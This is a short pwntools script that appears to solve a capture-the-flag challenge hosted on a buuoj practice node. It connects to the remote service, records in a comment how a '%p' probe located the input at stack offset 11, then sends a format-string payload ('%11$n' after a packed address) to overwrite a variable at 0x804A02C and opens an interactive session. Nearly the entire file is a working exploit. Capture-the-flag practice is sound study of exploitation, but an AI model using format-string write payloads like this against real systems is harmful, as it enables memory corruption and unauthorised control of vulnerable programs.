from pwn import *

x_addr = 0x804A02C

r = remote('node5.buuoj.cn', 26355)

'''
aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
aaaa.0xffbc45ec.0x50.0x1.(nil).0x1.0xf7fbea60.0xffbc4704.(nil).0xffbc48bb.0x38.0x61616161.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70
3!

# 位于第11位
'''
payload = p32(x_addr) + b'%11$n'
r.sendline(payload)
r.interactive()
